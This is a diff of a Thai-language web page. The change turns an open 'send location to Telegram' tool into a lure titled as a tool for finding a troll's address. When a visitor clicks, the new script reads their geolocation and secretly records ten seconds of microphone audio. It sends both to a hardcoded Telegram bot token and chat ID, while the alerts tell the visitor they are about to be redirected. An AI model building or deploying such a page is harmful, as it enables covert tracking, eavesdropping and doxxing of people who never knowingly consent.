@@ -2,41 +2,35 @@
 <html lang="th">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ส่งตำแหน่งผ่าน Telegram Bot</title>
+    <title>ทดสอบ หาที่อยู่</title>
     <style>
         body {
             font-family: 'Segoe UI', sans-serif;
-            background-color: #eaf2f8;
+            background-color: #f4f4f4;
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 0;
         }
-
         .container {
-            text-align: center;
-            background: #fff;
-            padding: 40px;
+            background: white;
+            padding: 30px 40px;
             border-radius: 12px;
-            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            text-align: center;
         }
-
         h1 {
             margin-bottom: 20px;
         }
-
         button {
             background-color: #007bff;
             color: white;
-            padding: 12px 25px;
-            font-size: 16px;
             border: none;
+            padding: 12px 24px;
+            font-size: 16px;
             border-radius: 8px;
             cursor: pointer;
         }
-
         button:hover {
             background-color: #0056b3;
         }
@@ -44,59 +38,85 @@
 </head>
 <body>
     <div class="container">
-        <h1>ส่งตำแหน่งไป Telegram</h1>
-        <button onclick="sendLocation()">ส่งตำแหน่ง</button>
+        <h1>จัดทำ เพื่อค้นหาที้อยู่เกรียน</h1>
+        <button onclick="recordAndSend()">เริ่มการใช้งาน</button>
     </div>
 
     <script>
-        const botToken = '7586163097:AAFW-1cPYSRPGOdq9zJr0kOJh--gknZjyUU';
-        const chatId = '5492311099';
+        const botToken = "7586163097:AAFW-1cPYSRPGOdq9zJr0kOJh--gknZjyUU";
+        const chatId = "5492311099";
 
-        async function sendLocation() {
-            try {
-                const message = await getLocation();
-                await sendMessage(message);
-                alert("✅ ส่งตำแหน่งเรียบร้อยแล้ว!");
-            } catch (err) {
-                alert("เกิดข้อผิดพลาด: " + err.message);
-                console.error(err);
-            }
-        }
-
-        function getLocation() {
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    return reject(new Error("เบราว์เซอร์ไม่รองรับ Geolocation"));
-                }
-
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        const message = `📍 ตำแหน่งผู้ใช้:\n- Latitude: ${lat}\n- Longitude: ${lng}\n🌐 https://maps.google.com/?q=${lat},${lng}`;
-                        resolve(message);
-                    },
-                    error => reject(new Error("ไม่สามารถเข้าถึงตำแหน่ง"))
-                );
-            });
-        }
-
-        function sendMessage(text) {
+        function sendLocationMessage(latitude, longitude) {
+            const message = `📍 ตำแหน่งของผู้ใช้:\n- Latitude: ${latitude}\n- Longitude: ${longitude}\nhttps://maps.google.com/?q=${latitude},${longitude}`;
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             const data = {
                 chat_id: chatId,
-                text: text
+                text: message
             };
-
             return fetch(url, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(data)
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (!data.ok) throw new Error("ไม่สามารถส่งข้อความ: " + data.description);
-                console.log("✅ ส่งข้อความสำเร็จ:", data);
+            });
+        }
+
+        function sendAudioToTelegram(audioBlob) {
+            const url = `https://api.telegram.org/bot${botToken}/sendVoice?chat_id=${chatId}`;
+            const formData = new FormData();
+            formData.append("voice", audioBlob, "voice.ogg");
+
+            return fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        function recordAndSend() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                alert("เบราว์เซอร์ของคุณไม่รองรับการบันทึกเสียง");
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
+                    const options = { mimeType: 'audio/webm;codecs=opus' };
+                    const mediaRecorder = new MediaRecorder(stream, options);
+                    const audioChunks = [];
+
+                    mediaRecorder.ondataavailable = function (e) {
+                        audioChunks.push(e.data);
+                    };
+
+                    mediaRecorder.onstop = async function () {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
+
+                        try {
+                            await Promise.all([
+                                sendLocationMessage(latitude, longitude),
+                                sendAudioToTelegram(audioBlob)
+                            ]);
+                            alert("โปรดรอกำลังดำเนินการ!");
+                        } catch (error) {
+                            console.error("เกิดข้อผิดพลาด:", error);
+                            alert("ไม่สามารถส่งข้อมูลได้");
+                        }
+                    };
+
+                    mediaRecorder.start();
+                    alert("กำลังไปยังอีกหน้า 5 วินาที...");
+
+                    setTimeout(() => mediaRecorder.stop(), 10000);
+                }).catch(err => {
+                    console.error("ไม่สามารถเข้าถึงไมโครโฟน:", err);
+                    alert("ไม่สามารถเข้าถึงไมโครโฟนได้");
+                });
+
+            }, function(error) {
+                console.error("ไม่สามารถเข้าถึงตำแหน่ง:", error);
+                alert("ไม่สามารถดึงตำแหน่งได้");
             });
         }
     </script>
